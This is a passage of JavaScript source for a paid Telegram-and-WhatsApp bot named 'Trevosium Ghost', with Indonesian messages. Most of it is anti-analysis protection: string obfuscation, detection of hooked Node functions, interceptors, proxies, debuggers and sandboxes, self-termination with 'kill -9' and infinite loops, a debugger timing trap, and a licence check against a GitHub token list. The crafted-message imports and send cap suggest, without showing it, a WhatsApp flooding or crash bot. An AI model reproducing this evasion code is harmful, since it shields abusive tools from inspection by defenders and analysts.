(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const FormData = require("form-data");
const yts = require("yt-search");
const fetch = require("node-fetch");
const AdmZip = require("adm-zip");
const https = require("https");

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    fetchLatestBaileysVersion,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('xatabail');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.exit(1);
  }
  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.exit(1);
  }
  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.exit(1);
  }
  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.exit(1);
  }
  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.exit(1);
  }
  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.exit(1);
  }
  setInterval(() => {
    if (process.exit.toString().includes("console.log") ||
        process.abort.toString().includes("console.log")) {
      console.error(`[SECURITY] Process function dibajak saat runtime`);
      process.exit(1);
    }
  }, 500);

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.exit(1);
}


const databaseUrl = 'https://raw.githubusercontent.com/rizkyyy02xi-sudo/xyrennpedo/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/gz9piz.jpg";
const thumbnailUrl2 = "https://files.catbox.moe/t504lc.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 50) {
      throw new Error(randErr());
    }
  }, 500);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
☇ Botname: Trevosium Ghost 
☇ Version: 24.0
☇ Status: Bot Connected
═════════════════════
═══════════
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
═════════════════════
═══════════
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
Perubahan kode terdeteksi, Harap membeli script kepada reseller
yang tersedia dan legal
═════════════════════
═══════════
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
═════════════════════
═══════════
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════
═════════════════════
Gagal menghubungkan ke server, Akses ditolak
═════════════════════
═══════════
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function checkGroupOnly(ctx) {
  if (GROUP_ONLY && ctx.chat.type === "private") {
    ctx.reply("❌ Bot ini hanya dapat digunakan di group!")
      .then((sent) => {
        setTimeout(async () => {
          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, sent.message_id);
          } catch (e) {}

          try {
            await ctx.telegram.deleteMessage(ctx.chat.id, ctx.message.message_id);
          } catch (e) {}
        }, 3000);
      });

    return false;
  }

  return true;
}

function uploadToCatbox(fileUrl) {
  const params = new URLSearchParams();
  params.append("reqtype", "urlupload");
  params.append("url", fileUrl);

  return axios.post("https://catbox.moe/user/api.php", params, {
    headers: { "content-type": "application/x-www-form-urlencoded" },
    timeout: 30000,
  }).then(({ data }) => data);
}

function createSafeSock(sock) {
  return new Proxy(sock, {
    get(target, prop) {
      if (["relayMessage", "sendMessage"].includes(prop)) return target[prop];
      return undefined;
    },
  });
}

function txt(m) {
  if (!m) return "";
  return (m.text || m.caption || "").trim();
}

function parseSecs(s) {
  if (typeof s === "number") return s;
  if (!s || typeof s !== "string") return 0;
  return s
    .split(":")
    .map(n => parseInt(n, 10))
    .reduce((a, v) => a * 60 + v, 0);
}

const topVideos = async (q) => {
  const r = await yts.search(q);
  const list = Array.isArray(r) ? r : (r.videos || []);
  return list
